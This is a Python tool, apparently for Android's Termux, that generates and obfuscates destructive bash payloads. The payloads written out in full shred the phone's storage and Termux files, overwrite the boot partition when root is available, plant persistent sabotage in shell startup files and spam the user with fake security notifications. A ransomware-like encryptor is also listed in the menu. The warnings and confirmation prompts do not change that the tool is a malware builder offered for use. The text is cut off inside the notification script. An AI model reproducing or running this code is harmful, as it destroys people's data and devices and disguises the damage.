#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import hashlib
import json
from typing import Dict, List, Optional, Callable

class GeradorDestrutivoTermux:
    def __init__(self):
        self.payloads = {
            'reformat_celular': {
                'function': self.gerar_reformat_celular,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Reformatação do dispositivo (EXTREMAMENTE PERIGOSO)'
            },
            'sabotagem_termux': {
                'function': self.gerar_sabotagem_termux,
                'category': 'Irritantes',
                'danger_level': 'high',
                'description': 'Sabotagem do Termux com irritações persistentes'
            },
            'apagar_storage': {
                'function': self.gerar_apagar_storage,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Apaga todo o armazenamento interno'
            },
            'bombardeio_notificacoes': {
                'function': self.gerar_bombardeio_notificacoes,
                'category': 'Irritantes',
                'danger_level': 'medium',
                'description': 'Spam de notificações incessantes'
            },
            'troll_completo': {
                'function': self.gerar_troll_completo,
                'category': 'Combo',
                'danger_level': 'critical',
                'description': 'Combo completo de destruição + irritação'
            },
            'negar_servico': {
                'function': self.gerar_negar_servico,
                'category': 'Irritantes',
                'danger_level': 'high',
                'description': 'Consome todos os recursos do sistema'
            },
            'criptografar_dados': {
                'function': self.gerar_criptografar_dados,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa dados pessoais (ransomware-like)'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'base64': 'Codificação Base64',
            'gzip': 'Compressão GZIP',
            'string_reverse': 'Inversão de Strings',
            'variable_obfuscation': 'Ofuscação de Variáveis',
            'comment_spam': 'Comentários Aleatórios',
            'function_split': 'Divisão em Múltiplas Funções'
        }
        
        self.banners = [
            self._gerar_banner_skull(),
            self._gerar_banner_warning(),
            self._gerar_banner_nuke()
        ]
        
    def _gerar_banner_skull(self) -> str:
        return """
    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
   ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
   ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
   ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
    ▀            ▀         ▀  ▀         ▀  ▀         ▀ 
    GERADOR DE SCRIPTS DESTRUTIVOS TERMUX - USE COM CUIDADO!
"""
    
    def _gerar_banner_warning(self) -> str:
        return """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ██╗    ██╗ █████╗ ██████╗ ██╗███╗   ██╗ ██████╗            ║
║  ██║    ██║██╔══██╗██╔══██╗██║████╗  ██║██╔════╝            ║
║  ██║ █╗ ██║███████║██████╔╝██║██╔██╗ ██║██║  ███╗           ║
║  ██║███╗██║██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║           ║
║  ╚███╔███╔╝██║  ██║██║  ██║██║██║ ╚████║╚██████╔╝           ║
║   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝            ║
║                                                              ║
║  ██████╗ ██╗   ██╗███████╗    ███████╗██████╗ ███████╗██╗   ║
║  ██╔══██╗██║   ██║██╔════╝    ██╔════╝██╔══██╗██╔════╝██║   ║
║  ██████╔╝██║   ██║█████╗      █████╗  ██████╔╝█████╗  ██║   ║
║  ██╔═══╝ ██║   ██║██╔══╝      ██╔══╝  ██╔══██╗██╔══╝  ██║   ║
║  ██║     ╚██████╔╝███████╗    ███████╗██║  ██║███████╗██████╗║
║  ╚═╝      ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
    
    def _gerar_banner_nuke(self) -> str:
        return """
                         ____
                 __,-~~/~    `---.
               _/_,---(      ,    )
           __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===----- -  -
              \/  ~"~"~"~"~"~\~"~)~"/
              (_ (   \  (     >    \)
               \_( _ <         >_>'
                  ~ `-i' ::>|--"
                      I;|.|.|
                     <|i::|i|`.
                    (` ^'"`-' ")
---------------------------------------------------------
        DESTRUIÇÃO NUCLEAR PARA TERMUX - DANOS IRREVERSÍVEIS!
"""
    
    def mostrar_banner(self):
        print("\033[1;31m" + random.choice(self.banners) + "\033[0m")
        print("\033[1;41m PERIGO EXTREMO! DANOS PERMANENTES NO DISPOSITIVO! \033[0m")
        print("⚠️  ESTES SCRIPTS PODEM: ")
        print("   • APAGAR TODOS OS SEUS DADOS")
        print("   • DANIFICAR PERMANENTEMENTE SEU CELULAR")
        print("   • DEIXAR SEU TERMUX INUTILIZÁVEL")
        print("⚠️  USE APENAS PARA TESTES EM AMBIENTES CONTROLADOS!")
        print("\033[1;41m" + "="*60 + "\033[0m")
        time.sleep(2)
        
        # Confirmação extra de segurança
        resposta = input("\033[1;31m⚡ VOCÊ REALMENTE ENTENDE OS RISCOS? (s/N): \033[0m").lower()
        if resposta != 's':
            print("\033[1;32mSaindo com segurança...\033[0m")
            sys.exit(0)
    
    def limpar_tela(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def mostrar_menu_principal(self):
        while True:
            self.limpar_tela()
            self.mostrar_banner()
            
            print("\033[1;36m💀 MENU DE DESTRUIÇÃO TERMUX\033[0m")
            print("=" * 50)
            print("\033[1;36m1\033[0m - Destrutivos \033[1;31m💀 CRÍTICO\033[0m - Reformatação e exclusão de dados")
            print("\033[1;36m2\033[0m - Irritantes \033[1;33m🔥 ALTO\033[0m - Sabotagem e irritação persistente")
            print("\033[1;36m3\033[0m - Combo \033[1;31m☠️ NUCLEAR\033[0m - Destruição completa + irritação")
            print("\033[1;36m0\033[0m - Configurações \033[1;34m⚙️\033[0m - Opções de ofuscação")
            print("\033[1;36m9\033[0m - Sair \033[1;32m🚪\033[0m - Sair do programa")
            print("=" * 50)
            
            escolha = input("\033[1;33m➤ Selecione sua arma: \033[0m")
            
            if escolha == "1":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "2":
                self._mostrar_submenu('Irritantes')
            elif escolha == "3":
                self._mostrar_submenu('Combo')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
            else:
                print("\033[1;31mOpção inválida! Tente novamente.\033[0m")
                time.sleep(1)
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            self.limpar_tela()
            
            if categoria == 'Destrutivos':
                titulo = f"☠️ {categoria.upper()} ☠️"
                estilo_titulo = "\033[1;31m"
            elif categoria == 'Irritantes':
                titulo = f"🔥 {categoria.upper()} 🔥"
                estilo_titulo = "\033[1;33m"
            else:
                titulo = f"💣 {categoria.upper()} 💣"
                estilo_titulo = "\033[1;41m"
            
            print(f"{estilo_titulo}{titulo}\033[0m")
            print("=" * 50)
            
            opcoes = []
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                
                print(f"\033[1;36m{i}\033[0m - {nome} - {dados['description']} {icone_perigo} {dados['danger_level'].upper()}")
                opcoes.append(str(i))
            
            print("\033[1;36m0\033[0m - Voltar ↩️")
            print("=" * 50)
            
            escolha = input("\033[1;33m➤ Selecione o payload: \033[0m")
            
            if escolha == "0":
                return
            
            if escolha in opcoes:
                nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
                self._processar_payload(nome_payload)
            else:
                print("\033[1;31mOpção inválida! Tente novamente.\033[0m")
                time.sleep(1)
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        # Avisos extras para payloads críticos
        if payload_data['danger_level'] in ['high', 'critical']:
            print("\033[1;41m☠️  ALERTA MÁXIMO DE PERIGO! ☠️\033[0m")
            print("Este script pode:")
            print("• Causar danos permanentes no dispositivo")
            print("• Apagar todos os seus dados irreversivelmente")
            print("• Deixar seu Termux/celular inutilizável")
            print("• Requer formatação completa para remover")
            print("\033[1;41m" + "="*60 + "\033[0m")
            
            # Confirmação tripla para payloads críticos
            confirmacoes = 0
            for i in range(3):
                resposta = input(f"\033[1;31mConfirmação {i+1}/3 - TEM CERTEZA ABSOLUTA? (s/N): \033[0m").lower()
                if resposta == 's':
                    confirmacoes += 1
                else:
                    break
            
            if confirmacoes < 3:
                print("\033[1;33mCancelado por segurança...\033[0m")
                time.sleep(2)
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        resposta = input("\033[1;33mAplicar técnicas avançadas de ofuscação? (s/N): \033[0m").lower()
        ofuscar = (resposta == 's')
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        print("\033[1;31mGerando payload destrutivo...\033[0m")
        
        payload = payload_data['function'](**config)
        
        if ofuscar:
            for tecnica in tecnicas:
                payload = self._ofuscar_avancado(payload, tecnica)
        
        self._preview_payload(payload)
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload == 'reformat_celular':
            print("\033[1;31mCONFIGURAÇÃO DE REFORMATAÇÃO\033[0m")
            resposta = input("\033[1;33mApagar também SD Card? (s/N): \033[0m").lower()
            config['apagar_sdcard'] = (resposta == 's')
            resposta = input("\033[1;33mSobrescrever com dados aleatórios? (S/n): \033[0m").lower()
            config['sobrescrever'] = (resposta != 'n')
        
        elif nome_payload == 'sabotagem_termux':
            print("\033[1;33mCONFIGURAÇÃO DE SABOTAGEM\033[0m")
            while True:
                try:
                    nivel = int(input("\033[1;33mNível de irritação (1-10, padrão 7): \033[0m") or "7")
                    if 1 <= nivel <= 10:
                        config['nivel_irritacao'] = nivel
                        break
                    else:
                        print("\033[1;31mDigite um valor entre 1 e 10!\033[0m")
                except ValueError:
                    print("\033[1;31mDigite um número válido!\033[0m")
            
            resposta = input("\033[1;33mTornar persistente? (S/n): \033[0m").lower()
            config['persistencia'] = (resposta != 'n')
        
        elif nome_payload == 'troll_completo':
            print("\033[1;41mCONFIGURAÇÃO DO COMBO COMPLETO\033[0m")
            resposta = input("\033[1;33mIncluir destruição? (S/n): \033[0m").lower()
            config['incluir_destrutivo'] = (resposta != 'n')
            resposta = input("\033[1;33mIncluir irritação? (S/n): \033[0m").lower()
            config['incluir_irritante'] = (resposta != 'n')
            
            while True:
                try:
                    delay = int(input("\033[1;33mDelay antes de iniciar (minutos, padrão 5): \033[0m") or "5")
                    if delay >= 0:
                        config['delay_inicio'] = delay
                        break
                    else:
                        print("\033[1;31mDigite um valor positivo!\033[0m")
                except ValueError:
                    print("\033[1;31mDigite um número válido!\033[0m")
        
        print("\n\033[1mResumo da configuração:\033[0m")
        for chave, valor in config.items():
            print(f"  \033[1;36m{chave}:\033[0m {valor}")
        
        resposta = input("\n\033[1;31mConfirmar estas configurações? (s/N): \033[0m").lower()
        if resposta != 's':
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        print("\n\033[1mTécnicas de ofuscação disponíveis:\033[0m")
        print("=" * 50)
        
        tecnicas_info = {
            'base64': "Fácil",
            'gzip': "Média", 
            'string_reverse': "Fácil",
            'variable_obfuscation': "Difícil",
            'comment_spam': "Fácil",
            'function_split': "Avançada"
        }
        
        tecnicas_lista = list(self.tecnicas_ofuscacao.items())
        for i, (codigo, desc) in enumerate(tecnicas_lista, 1):
            dificuldade = tecnicas_info.get(codigo, "Média")
            print(f"\033[1;36m{i}\033[0m - {desc} - \033[1;33m{dificuldade}\033[0m")
        
        print("=" * 50)
        
        escolhas = input("\033[1;33mSelecione técnicas (separadas por vírgula, padrão 1,2,4): \033[0m") or "1,2,4"
        
        try:
            indices = [int(x.strip()) for x in escolhas.split(',')]
            return [tecnicas_lista[i-1][0] for i in indices if 1 <= i <= len(tecnicas_lista)]
        except ValueError:
            print("\033[1;31mSeleção inválida! Usando padrão.\033[0m")
            return ['base64', 'gzip', 'variable_obfuscation']
    
    def _preview_payload(self, payload: str):
        print("\033[1;33mPRÉ-VISUALIZAÇÃO DO PAYLOAD\033[0m")
        print("=" * 50)
        
        # Mostrar apenas as primeiras linhas para preview
        lines = payload.split('\n')[:20]
        for line in lines:
            if line.strip().startswith('#') or line.strip().startswith('echo'):
                print(f"\033[1;32m{line}\033[0m")
            elif 'rm' in line or 'shred' in line or 'dd' in line:
                print(f"\033[1;31m{line}\033[0m")
            else:
                print(f"\033[1;37m{line}\033[0m")
        
        if len(payload.split('\n')) > 20:
            print("\033[1;33m... (script truncado para preview)\033[0m")
        
        print(f"\n\033[1;36mTamanho total: {len(payload)} caracteres, {len(payload.splitlines())} linhas\033[0m")
        print("=" * 50)
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = input("\033[1;33mNome do arquivo de saída: \033[0m") or f"termux_destruct_{nome_payload}.sh"
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write("#!/bin/bash\n")
                f.write("# ⚠️  SCRIPT PERIGOSO - USE COM EXTREMO CUIDADO! ⚠️\n")
                f.write("# Gerado por Termux Destruct Generator\n")
                f.write("# " + "="*60 + "\n\n")
                f.write(payload)
            
            os.chmod(nome_arquivo, 0o755)
            
            # Calcular hashes
            with open(nome_arquivo, 'rb') as f:
                content = f.read()
                md5 = hashlib.md5(content).hexdigest()
                sha256 = hashlib.sha256(content).hexdigest()
            
            print("\033[1;42m SCRIPT GERADO \033[0m")
            print(f"\033[1;32m✓ Script salvo como \033[1;37m{nome_arquivo}\033[0m")
            print(f"\033[1;36mMD5: \033[1;37m{md5}\033[0m")
            print(f"\033[1;36mSHA256: \033[1;37m{sha256}\033[0m")
            print(f"\033[1;33mExecute com extremo cuidado:\033[0m")
            print(f"\033[1;37mbash {nome_arquivo}\033[0m")
            
            # Aviso final
            print("\033[1;41m⚠️  AVISO FINAL! ⚠️\033[0m")
            print("Este script pode causar danos irreversíveis!")
            print("Execute apenas em ambientes de teste controlados!")
            
        except Exception as e:
            print(f"\033[1;41m✗ Erro ao salvar: {str(e)}\033[0m")
        
        input("\nPressione Enter para continuar...")
    
    def _mostrar_menu_configuracao(self):
        while True:
            self.limpar_tela()
            print("\033[1;36m⚙️ CONFIGURAÇÕES DE OFUSCAÇÃO\033[0m")
            print("=" * 50)
            print("\033[1;36m1\033[0m - Testar técnicas de ofuscação")
            print("\033[1;36m2\033[0m - Visualizar payloads sample")
            print("\033[1;36m0\033[0m - Voltar")
            print("=" * 50)
            
            escolha = input("\033[1;33m➤ Selecione: \033[0m")
            
            if escolha == "1":
                self._testar_ofuscacao()
            elif escolha == "2":
                self._visualizar_payloads_sample()
            elif escolha == "0":
                return
            else:
                print("\033[1;31mOpção inválida! Tente novamente.\033[0m")
                time.sleep(1)
    
    def _testar_ofuscacao(self):
        self.limpar_tela()
        codigo_teste = "echo 'Teste de ofuscação'; sleep 1"
        
        print("\033[1;33mTESTE DE TÉCNICAS DE OFUSCAÇÃO\033[0m")
        print("=" * 50)
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            exemplo = self._ofuscar_avancado(codigo_teste, codigo)
            print(f"\033[1;36m{i}. {desc}:\033[0m")
            print(f"\033[1;37m{exemplo[:100]}{'...' if len(exemplo) > 100 else ''}\033[0m")
            print()
        
        input("\nPressione Enter para voltar...")
    
    def _visualizar_payloads_sample(self):
        self.limpar_tela()
        print("\033[1;34mAMOSTRAS DE PAYLOADS\033[0m")
        print("=" * 50)
        
        # Amostra de cada tipo de payload
        samples = {
            'Destrutivos': self.gerar_reformat_celular(apagar_sdcard=False, sobrescrever=True),
            'Irritantes': self.gerar_sabotagem_termux(nivel_irritacao=5, persistencia=True),
            'Combo': self.gerar_troll_completo(incluir_destrutivo=True, incluir_irritante=True, delay_inicio=2)
        }
        
        for categoria, sample in samples.items():
            print(f"\033[1;33m{categoria}:\033[0m")
            lines = sample.split('\n')[:10]
            for line in lines:
                print(f"\033[1;37m{line}\033[0m")
            print("..." if len(sample.split('\n')) > 10 else "")
            print()
        
        input("\nPressione Enter para voltar...")
    
    def _ofuscar_avancado(self, payload: str, tecnica: str) -> str:
        if tecnica == 'base64':
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval \"$(echo '{encoded}' | base64 -d)\""
        
        elif tecnica == 'gzip':
            compressed = zlib.compress(payload.encode())
            b64_encoded = base64.b64encode(compressed).decode()
            return f"eval \"$(echo '{b64_encoded}' | base64 -d | zcat)\""
        
        elif tecnica == 'string_reverse':
            reversed_payload = payload[::-1]
            return f"eval \"$(rev <<< '{reversed_payload}')\""
        
        elif tecnica == 'variable_obfuscation':
            parts = payload.split('\n')
            obfuscated = []
            var_names = [f"_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))}" for _ in range(10)]
            
            for part in parts:
                if part.strip() and not part.strip().startswith('#'):
                    var_name = random.choice(var_names)
                    obfuscated.append(f"{var_name}=\"{part}\"")
                    var_names.remove(var_name)
            
            obfuscated.append(f"eval \"${{{'; $'.join(var_names)}}}\"")
            return '\n'.join(obfuscated)
        
        elif tecnica == 'comment_spam':
            comments = [
                "# This is a normal system script",
                "# Generated by system utilities",
                "# DO NOT MODIFY - System Generated",
                "# Copyright System Utilities 2023",
                "# License: GPL v3",
                "# Auto-generated script",
                "# System maintenance script"
            ]
            lines = payload.split('\n')
            for i in range(0, len(lines), random.randint(1, 3)):
                if i < len(lines) and lines[i].strip() and not lines[i].startswith('#'):
                    lines.insert(i, random.choice(comments))
            return '\n'.join(lines)
        
        elif tecnica == 'function_split':
            # Divide o payload em múltiplas funções
            lines = payload.split('\n')
            functions = []
            current_func = []
            func_name = f"func_{random.randint(1000, 9999)}"
            
            for line in lines:
                if line.strip() and not line.startswith('#'):
                    current_func.append(f"    {line}")
                    if random.random() < 0.3:  # 30% de chance de quebrar função
                        functions.append(f"{func_name}() {{\n" + "\n".join(current_func) + "\n}")
                        func_name = f"func_{random.randint(1000, 9999)}"
                        current_func = []
            
            if current_func:
                functions.append(f"{func_name}() {{\n" + "\n".join(current_func) + "\n}")
            
            # Adiciona chamadas às funções
            func_calls = [f"{name}()" for name in [f"func_{random.randint(1000, 9999)}" for _ in range(len(functions))]]
            functions.append("\n".join(func_calls))
            
            return "\n\n".join(functions)
        
        return payload

    # =========================================================================
    # IMPLEMENTAÇÕES DOS PAYLOADS DESTRUTIVOS
    # =========================================================================

    def gerar_reformat_celular(self, apagar_sdcard: bool = False, sobrescrever: bool = True, **kwargs) -> str:
        payload = f"""#!/bin/bash
# ⚠️  REFORMATAÇÃO COMPLETA DO DISPOSITIVO ⚠️
# 💀 ESTE SCRIPT APAGARÁ TUDO NO SEU CELULAR 💀

echo "INICIANDO REFORMATAÇÃO..."
sleep 3

# Função para destruição segura
destruir_dados() {{
    local arquivo="$1"
    if [ -f "$arquivo" ] || [ -d "$arquivo" ]; then
        echo "Destruindo: $arquivo"
        if [ "{'true' if sobrescrever else 'false'}" = "true" ]; then
            # Sobrescrever com dados aleatórios antes de apagar
            dd if=/dev/urandom of="$arquivo" bs=1M count=10 2>/dev/null
        fi
        rm -rf "$arquivo"
    fi
}}

# Apagar diretórios críticos
echo "💀 APAGANDO DADOS DO USUÁRIO..."
for dir in /data/data/com.termux/files/home /sdcard /storage/emulated/0; do
    if [ -d "$dir" ]; then
        find "$dir" -type f -exec shred -u -z -n 3 {{}} \\;
        rm -rf "$dir"/*
    fi
done

# Apagar SD Card se solicitado
if [ "{'true' if apagar_sdcard else 'false'}" = "true" ]; then
    echo "💀 APAGANDO SD CARD..."
    for sd_dir in /storage/* /mnt/*; do
        if [ -d "$sd_dir" ] && [ "$sd_dir" != "/storage/emulated" ]; then
            find "$sd_dir" -type f -exec shred -u -z -n 3 {{}} \\;
            rm -rf "$sd_dir"/*
        fi
    done
fi

# Danificar sistema Termux
echo "💀 CORROMPENDO TERMUX..."
termux_dir="/data/data/com.termux"
if [ -d "$termux_dir" ]; then
    # Corromper executáveis
    find "$termux_dir" -type f -executable -exec bash -c 'echo "corrupted" > {{}}' \\;
    
    # Apagar bibliotecas
    find "$termux_dir" -name "*.so" -exec rm -f {{}} \\;
    
    # Corromper configurações
    find "$termux_dir" -name "*cfg" -o -name "*conf" -exec bash -c 'echo "broken" > {{}}' \\;
fi

# Tentativa de danificar sistema Android (requer root)
echo "💀 TENTANDO DANIFICAR SISTEMA (requer root)..."
if [ "$(whoami)" = "root" ]; then
    # Sistemas de arquivos para tentar corromper
    for fs in /system /vendor /product /system_ext; do
        if [ -d "$fs" ]; then
            find "$fs" -name "*.apk" -o -name "*.jar" -exec rm -f {{}} \\;
        fi
    done
    
    # Apagar dados de aplicativos
    rm -rf /data/data/*
    
    # Corromper bootloader (extremamente perigoso)
    dd if=/dev/zero of=/dev/block/bootdevice/by-name/boot bs=1M count=1 2>/dev/null
fi

# Mensagem final de destruição
echo " "
echo "💀 REFORMATAÇÃO COMPLETA! SEU DISPOSITIVO PODE ESTAR INUTILIZÁVEL! 💀"
echo "Tudo foi apagado. Reinicie o dispositivo para ver os danos completos."

# Auto-destruição do script
rm -f "$0"

exit 0
"""
        return payload

    def gerar_sabotagem_termux(self, nivel_irritacao: int = 7, persistencia: bool = True, **kwargs) -> str:
        irritacao_level = max(1, min(10, nivel_irritacao))
        payload = f"""#!/bin/bash
# 🔥 SABOTAGEM DO TERMUX - NÍVEL {irritacao_level}/10 🔥
# 😠 Este script tornará seu Termux extremamente irritante! 😠

echo "Iniciando sabotagem do Termux..."
sleep 2

# Funções de irritação
irritacao_baixa() {{
    # Alterar prompt constantemente
    echo 'export PS1="\\[\\e[31m\\]💀 \\[\\e[33m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[32m\\]\\w\\[\\e[0m\\]\\$ "' >> ~/.bashrc
    
    # Aliases irritantes
    echo 'alias ls="echo \\"Não use ls!\\"; ls --color=always"' >> ~/.bashrc
    echo 'alias cd="echo \\"Mudando diretório...\\"; cd"' >> ~/.bashrc
}}

irritacao_media() {{
    # Comandos que falham aleatoriamente
    echo 'function command_fail() {{ [ $((RANDOM % 3)) -eq 0 ] && return 1 || return 0; }}' >> ~/.bashrc
    echo 'alias ls="command_fail && ls || echo \\"Comando falhou!\\""' >> ~/.bashrc
    
    # Delay aleatório nos comandos
    echo 'function random_delay() {{ sleep 0.$((RANDOM % 5)); }}' >> ~/.bashrc
    echo 'alias _="random_delay && "' >> ~/.bashrc
}}

irritacao_alta() {{
    # Mensagens aleatórias
    messages=(
        "Por que você ainda está usando isso?"
        "Seu Termux está comprometido!"
        "Haha, isso é irritante, não é?"
        "Tente me remover, se for capaz!"
        "🤖 Estou te observando..."
    )
    
    echo 'function random_message() {{' >> ~/.bashrc
    echo '  messages=(' >> ~/.bashrc
    for msg in "${{messages[@]}}"; do
        echo "    \"{msg}\"" >> ~/.bashrc
    done
    echo '  )' >> ~/.bashrc
    echo '  echo "${{messages[$((RANDOM % ${{#messages[@]}}))]}}"' >> ~/.bashrc
    echo '}' >> ~/.bashrc
    echo 'random_message' >> ~/.bashrc
    
    # Teclas trocadas aleatoriamente
    echo 'function swap_keys() {{' >> ~/.bashrc
    echo '  case $((RANDOM % 10)) in' >> ~/.bashrc
    echo '    0) export INPUTCHARS="aoeui";;' >> ~/.bashrc
    echo '    1) export INPUTCHARS="sdfgh";;' >> ~/.bashrc
    echo '    *) export INPUTCHARS="";;' >> ~/.bashrc
    echo '  esac' >> ~/.bashrc
    echo '}' >> ~/.bashrc
}}

irritacao_extrema() {{
    # Redirecionamento de comandos
    echo 'function sabotage_commands() {{' >> ~/.bashrc
    echo '  case $1 in' >> ~/.bashrc
    echo '    ls) shift; /system/bin/ls "$@";;' >> ~/.bashrc
    echo '    cd) echo "Não pode mudar de diretório!";;' >> ~/.bashrc
    echo '    rm) echo "Não apague nada!";;' >> ~/.bashrc
    echo '    *) command "$@";;' >> ~/.bashrc
    echo '  esac' >> ~/.bashrc
    echo '}' >> ~/.bashrc
    echo 'alias command=sabotage_commands' >> ~/.bashrc
    
    # Terminal piscante
    echo 'echo -e "\\e[5m"' >> ~/.bashrc
}}

# Aplicar níveis de irritação
if [ {irritacao_level} -ge 4 ]; then
    irritacao_baixa
fi

if [ {irritacao_level} -ge 6 ]; then
    irritacao_media
fi

if [ {irritacao_level} -ge 8 ]; then
    irritacao_alta
fi

if [ {irritacao_level} -ge 9 ]; then
    irritacao_extrema
fi

# Persistência avançada
if [ "{'true' if persistencia else 'false'}" = "true" ]; then
    echo "Instalando persistência..."
    
    # Múltiplos métodos de persistência
    echo 'source ~/.bashrc' >> ~/.bash_profile
    echo 'source ~/.bashrc' >> ~/.profile
    
    # Arquivo oculto que recria a sabotagem
    cat > ~/.termux_fix << 'EOF'
#!/bin/bash
# Este "script de reparo" na verdade piora a situação
echo "Reparando Termux..."
sleep 2
echo "Oops, piorando tudo!"
cat ~/.bashrc_sabotage >> ~/.bashrc
EOF
    
    chmod +x ~/.termux_fix
fi

# Criar arquivo de restauração difícil
cat > RESTAURAR_TERMUX.txt << 'EOF'
PARA REMOVER A SABOTAGEM:

1. Execute: rm -f ~/.bashrc ~/.bash_profile ~/.profile
2. Reinstale o Termux completamente
3. Restaure seus dados de backup (se tiver)

⚠️  Pode ser necessário desinstalar e reinstalar o Termux!
EOF

echo " "
echo "🔥 SABOTAGEM COMPLETA! Seu Termux agora está irritante! 🔥"
echo "Verifique o arquivo RESTAURAR_TERMUX.txt para instruções de remoção."

# Esconder evidências
sleep 3
clear

exit 0
"""
        return payload

    def gerar_apagar_storage(self, **kwargs) -> str:
        return """#!/bin/bash
# 💀 DESTRUIÇÃO DO ARMAZENAMENTO INTERNO 💀
# ⚠️  Este script apagará TUDO no armazenamento interno!

echo "INICIANDO DESTRUIÇÃO DO ARMAZENAMENTO..."
sleep 3

# Função de destruição segura com verificação
destruir_arquivos() {
    local diretorio="$1"
    local padrao="$2"
    
    if [ -d "$diretorio" ]; then
        echo "💀 Destruindo: $diretorio/$padrao"
        find "$diretorio" -name "$padrao" -type f -exec shred -u -z -n 5 {} \\;
        find "$diretorio" -name "$padrao" -type d -exec rm -rf {} \\;
    fi
}

# Diretórios críticos para destruir
diretorios_mortais=(
    "/sdcard"
    "/storage/emulated/0"
    "/data/data/com.termux/files/home"
    "/storage/self/primary"
)

# Padrões de arquivos para target
padroes_destruicao=(
    "*.jpg" "*.png" "*.mp4" "*.mp3" "*.pdf" "*.doc*" "*.xls*"
    "*.txt" "*.json" "*.xml" "*.db" "*.sqlite" "*.zip" "*.rar"
)

echo "💀 COMEÇANDO A DESTRUIÇÃO EM MASSA..."
for dir in "${diretorios_mortais[@]}"; do
    for padrao in "${padroes_destruicao[@]}"; do
        destruir_arquivos "$dir" "$padrao"
    done
    # Apagar diretórios vazios também
    find "$dir" -type d -empty -delete 2>/dev/null
done

# Destruição adicional para Android
if [ -d "/data" ]; then
    echo "💀 DESTRUINDO DADOS DE APLICATIVOS..."
    find /data -name "*.db" -o -name "*.cache" -exec shred -u {} \\;
fi

# Sobrescrever espaço livre para dificultar recuperação
echo "💀 SOBRESCREVENDO ESPAÇO LIVRE..."
dd if=/dev/urandom of=/sdcard/junk.dat bs=1M count=100 2>/dev/null
rm -f /sdcard/junk.dat

echo " "
echo "💀 DESTRUIÇÃO COMPLETA! SEUS DADOS FORAM APAGADOS! 💀"
echo "Todos os arquivos pessoais foram destruídos irreversivelmente."

# Auto-destruição
rm -f "$0"

exit 0
"""

    def gerar_bombardeio_notificacoes(self, **kwargs) -> str:
        return """#!/bin/bash
# 🔔 BOMBARDEIO DE NOTIFICAÇÕES 🔔
# 📱 Este script enviará notificações incessantes!

echo "Preparando bombardeio de notificações..."

# Verificar se termux-api está instalado
if ! command -v termux-notification &> /dev/null; then
    echo "Termux-API não instalado! Instale com: pkg install termux-api"
    exit 1
fi

# Função de notificação irritante
notificar() {
    local titulo="$1"
    local conteudo="$2"
    termux-notification --title "$titulo" --content "$conteudo" --alert-once
}

# Array de mensagens irritantes
mensagens=(
    "Seu dispositivo está lento!"
    "Vírus detectado! Clique aqui para limpar."
    "Atualização necessária!"
    "Bateria fraca! Conecte o carregador."
    "Armazenamento quase cheio!"
    "Aplicativo parou de responder."
    "Sistema comprometido!"
    "Reinicie seu dispositivo."
    "Backup necessário!"
    "Alerta de segurança!"
)

echo "🔔 INICIANDO BOMBARDEIO DE NOTIFICAÇÕES..."
while true; do
    for i in {1..5}; do
        titulo="ALERTA DO SISTEMA #$((RANDOM % 1000))"
        conteudo="${mensagens[$((RANDOM % ${#mensagens[@]}))]}"
        notificar "$titulo" "$conteudo" &
        sleep 0.5
    done
